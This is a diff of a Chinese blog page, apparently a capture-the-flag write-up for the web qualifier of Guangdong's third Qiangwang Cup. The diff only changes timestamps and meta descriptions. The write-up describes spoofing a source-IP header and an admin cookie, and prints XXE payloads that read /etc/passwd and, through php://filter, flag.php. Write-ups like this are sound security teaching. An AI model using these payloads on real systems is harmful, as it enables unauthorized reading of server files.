@@ -105,13 +105,13 @@
 
 
 
-  <meta name="description" content="0x00  前言好久没搭理博客，刚好今天闲着无聊就发现自己博客以及半年没跟更新了。惭愧惭愧。刚出整理出这几个月的总结发出来。以下是广东省第三届强网杯web初赛的writeup 0x01 web0x01 签到题网站访问 提示403. 构造HTTP请求Header实现“伪造来源IP”  Not admin 通过抓包分析数据看看。Admin=0,尝试admin=1，getflagFlag: 0x02 X">
+  <meta name="description" content="0x00  前言好久没搭理博客，刚好今天闲着无聊就发现自己博客以及半年没跟更新了。惭愧惭愧。刚出整理出这几个月的总结发出来。以下是广东省第三届强网杯web初赛的writeup 0x01 web0x01 签到题网站访问 提示403. 构造HTTP请求Header实现“伪造来源IP”  Not admin 通过抓包分析数据看看。Admin=0,尝试admin=1，getflag">
 <meta name="keywords" content="writeup">
 <meta property="og:type" content="article">
 <meta property="og:title" content="广东强网杯--web篇">
 <meta property="og:url" content="blog.manhao6.cn/2019/10/12/广东强网杯--web篇/index.html">
 <meta property="og:site_name" content="m&#39;bolg">
-<meta property="og:description" content="0x00  前言好久没搭理博客，刚好今天闲着无聊就发现自己博客以及半年没跟更新了。惭愧惭愧。刚出整理出这几个月的总结发出来。以下是广东省第三届强网杯web初赛的writeup 0x01 web0x01 签到题网站访问 提示403. 构造HTTP请求Header实现“伪造来源IP”  Not admin 通过抓包分析数据看看。Admin=0,尝试admin=1，getflagFlag: 0x02 X">
+<meta property="og:description" content="0x00  前言好久没搭理博客，刚好今天闲着无聊就发现自己博客以及半年没跟更新了。惭愧惭愧。刚出整理出这几个月的总结发出来。以下是广东省第三届强网杯web初赛的writeup 0x01 web0x01 签到题网站访问 提示403. 构造HTTP请求Header实现“伪造来源IP”  Not admin 通过抓包分析数据看看。Admin=0,尝试admin=1，getflag">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="http://picture.manhao6.cn/广东强网杯--web篇/20191012101304458.png">
 <meta property="og:image" content="http://picture.manhao6.cn/广东强网杯--web篇/20191012101319266.png">
@@ -150,10 +150,10 @@
 <meta property="og:image" content="http://picture.manhao6.cn/广东强网杯--web篇/20191012102259726.png">
 <meta property="og:image" content="http://picture.manhao6.cn/广东强网杯--web篇/20191012102311372.png">
 <meta property="og:image" content="http://picture.manhao6.cn/广东强网杯--web篇/20191012102320487.png">
-<meta property="og:updated_time" content="2019-10-12T14:28:10.460Z">
+<meta property="og:updated_time" content="2019-10-12T14:29:41.725Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="广东强网杯--web篇">
-<meta name="twitter:description" content="0x00  前言好久没搭理博客，刚好今天闲着无聊就发现自己博客以及半年没跟更新了。惭愧惭愧。刚出整理出这几个月的总结发出来。以下是广东省第三届强网杯web初赛的writeup 0x01 web0x01 签到题网站访问 提示403. 构造HTTP请求Header实现“伪造来源IP”  Not admin 通过抓包分析数据看看。Admin=0,尝试admin=1，getflagFlag: 0x02 X">
+<meta name="twitter:description" content="0x00  前言好久没搭理博客，刚好今天闲着无聊就发现自己博客以及半年没跟更新了。惭愧惭愧。刚出整理出这几个月的总结发出来。以下是广东省第三届强网杯web初赛的writeup 0x01 web0x01 签到题网站访问 提示403. 构造HTTP请求Header实现“伪造来源IP”  Not admin 通过抓包分析数据看看。Admin=0,尝试admin=1，getflag">
 <meta name="twitter:image" content="http://picture.manhao6.cn/广东强网杯--web篇/20191012101304458.png">
 
 
@@ -471,7 +471,7 @@
                 
               
 
-              <time title="创建时间：2019-10-12 22:08:27 / 修改时间：22:28:10" itemprop="dateCreated datePublished" datetime="2019-10-12T22:08:27+08:00">2019-10-12</time>
+              <time title="创建时间：2019-10-12 22:08:27 / 修改时间：22:29:41" itemprop="dateCreated datePublished" datetime="2019-10-12T22:08:27+08:00">2019-10-12</time>
             
 
             
@@ -536,7 +536,7 @@
 
       
         <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00  前言"></a>0x00  前言</h1><p>好久没搭理博客，刚好今天闲着无聊就发现自己博客以及半年没跟更新了。惭愧惭愧。刚出整理出这几个月的总结发出来。以下是广东省第三届强网杯web初赛的writeup</p>
-<h1 id="0x01-web"><a href="#0x01-web" class="headerlink" title="0x01 web"></a>0x01 web</h1><h2 id="0x01-签到题"><a href="#0x01-签到题" class="headerlink" title="0x01 签到题"></a>0x01 签到题</h2><p>网站访问 提示403. 构造HTTP请求Header实现“伪造来源IP”<br> <img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101304458.png" alt><br> <img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101319266.png" alt><br>Not admin 通过抓包分析数据看看。Admin=0,尝试admin=1，getflag<br><img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101342210.png" alt><br>Flag:</p>
+<h1 id="0x01-web"><a href="#0x01-web" class="headerlink" title="0x01 web"></a>0x01 web</h1><h2 id="0x01-签到题"><a href="#0x01-签到题" class="headerlink" title="0x01 签到题"></a>0x01 签到题</h2><p>网站访问 提示403. 构造HTTP请求Header实现“伪造来源IP”<br> <img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101304458.png" alt><br> <img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101319266.png" alt><br>Not admin 通过抓包分析数据看看。Admin=0,尝试admin=1，getflag<br><img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101342210.png" alt><br><a id="more"></a></p>
 <h2 id="0x02-XXXXX？？？"><a href="#0x02-XXXXX？？？" class="headerlink" title="0x02 XXXXX？？？"></a>0x02 XXXXX？？？</h2><p><img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101447576.png" alt><br> 查看源码 无结果。联想到XXE漏洞。目录扫除查看到index.php~备份文件<br> <img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101455491.png" alt><br> <img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101502472.png" alt><br>查看源码。典型的xxe漏洞，<br> <img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101518638.png" alt><br>通过构造payload：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"ISO-8859-1"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE foo [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT foo ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pass</span>&gt;</span>xxe<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p><img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101552873.png" alt><br>尝试以半天读取flag.php，但是不知道文件具体目录在哪。Google一下读取相对路径来<br>利用php://filter/read=convert.base64-encode/resource=l来读取文件<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Payload</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"ISO-8859-1"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE foo [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT foo ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pass</span>&gt;</span>xxe<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p><img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101625148.png" alt><br>Bash64 解密：<br><img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101633791.png" alt><br>Flag: flag{IUyasd8213123123890}</p>
@@ -571,7 +571,7 @@
   <p><span>本文标题:</span><a href="/2019/10/12/广东强网杯--web篇/">广东强网杯--web篇</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 Tea_Mh 的个人博客">Tea_Mh</a></p>
   <p><span>发布时间:</span>2019年10月12日 - 22:08</p>
-  <p><span>最后更新:</span>2019年10月12日 - 22:28</p>
+  <p><span>最后更新:</span>2019年10月12日 - 22:29</p>
   <p><span>原始链接:</span><a href="/2019/10/12/广东强网杯--web篇/" title="广东强网杯--web篇">blog.manhao6.cn/2019/10/12/广东强网杯--web篇/</a>
     <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="blog.manhao6.cn/2019/10/12/广东强网杯--web篇/" aria-label="复制成功！"></i></span>
   </p>
